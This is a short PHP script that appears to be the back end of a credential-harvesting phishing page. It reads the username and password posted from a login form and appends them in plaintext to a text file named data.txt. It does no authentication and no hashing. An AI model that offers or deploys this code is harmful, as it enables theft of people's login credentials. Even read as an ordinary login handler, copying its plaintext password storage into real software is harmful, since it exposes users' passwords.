
<?php

 if(isset($_POST['loginBtn'])){
  $username = $_POST['name'];
  $password = $_POST['password'];
  $text = $username . ";" . $password . "\n";
  $fp = fopen('data.txt', 'a+');

    if(fwrite($fp, $text))  {
        echo 'saved';
    }
fclose ($fp);    
}
?>

